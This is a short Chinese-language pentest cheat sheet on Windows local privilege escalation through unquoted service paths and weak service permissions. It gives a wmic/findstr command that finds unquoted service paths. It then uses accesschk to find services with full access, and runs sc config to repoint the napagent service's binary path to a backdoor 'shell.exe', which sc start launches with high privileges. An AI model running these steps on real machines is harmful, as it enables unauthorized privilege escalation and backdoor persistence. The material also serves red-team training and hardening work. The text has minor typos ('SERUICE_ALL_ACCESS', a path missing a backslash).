## **不带引号服务路径**
检测
```
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
```
“C:\Program Files(x86)\Acunetix\wvssupervisor.exe”
不带引号
C:\Program Files(x86)\Acunetix\wvssupervisor.exe
如果存在C:\Program.exe是执行文件，会直接先执行这个。

## **不安全的服务权限**
条件：已经有本地账户权限

有些服务权限高 且 可以修改服务运行程序的路径。
可以用官方的工具accesschk.exe检测，同时可以修改为后门程序路径。
<https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk>
```
检测
accesschk.exe /accepteula

accesschk.exe -uwcqv "Administrators" *

看到napagent服务是SERUICE_ALL_ACCESS权限
修改执行路径
sc config "napagent" binpath="C:Users\Public\Downloads\shell.exe"

重启服务，或受害者启动，高权限执行后门上线
sc start napagent
```